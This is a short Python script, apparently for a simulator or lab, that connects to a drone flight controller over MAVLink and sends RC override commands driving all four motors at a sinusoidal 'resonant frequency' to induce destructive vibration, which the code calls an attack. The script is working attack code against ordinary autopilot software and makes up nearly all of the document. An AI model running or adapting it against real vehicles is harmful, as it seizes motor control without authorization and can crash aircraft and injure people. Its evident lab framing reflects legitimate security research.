from pymavlink import mavutil
import time
import math

# 1. Establish connection to the flight controller (SITL or Lab Network)
connection_string = 'tcp:127.0.0.1:5762'
print(f"Connecting to {connection_string}...")
master = mavutil.mavlink_connection(connection_string)
master.wait_heartbeat()
print("Heartbeat received. Target locked.")

# 2. Define the resonant attack parameters
# This frequency (Hz) should match the vulnerable f_n found in your MATLAB transmissibility analysis
resonant_frequency = 25.0  
amplitude = 300            
base_pwm = 1500            

def inject_vibration(duration):
    print(f"Injecting resonant frequency: {resonant_frequency} Hz for {duration} seconds...")
    start_time = time.time()
    
    # Calculate angular frequency
    omega = 2.0 * math.pi * resonant_frequency
    
    while (time.time() - start_time) < duration:
        current_time = time.time() - start_time
        
        # Harmonic excitation function
        current_pwm = int(base_pwm + amplitude * math.sin(omega * current_time))
        
        # 3. Send aggressive MAVLink RC Override commands to all 4 motors
        master.mav.rc_channels_override_send(
            master.target_system,
            master.target_component,
            current_pwm, current_pwm, current_pwm, current_pwm, 
            0, 0, 0, 0
        )
        
        # Maintain a fast update rate to accurately simulate the high-frequency wave
        time.sleep(0.01) 

    # 4. Release overrides and return control
    master.mav.rc_channels_override_send(
        master.target_system, master.target_component,
        0, 0, 0, 0, 0, 0, 0, 0
    )
    print("Attack simulation complete. Control released.")

# Execute the attack for 10 seconds
if __name__ == '__main__':
    inject_vibration(10)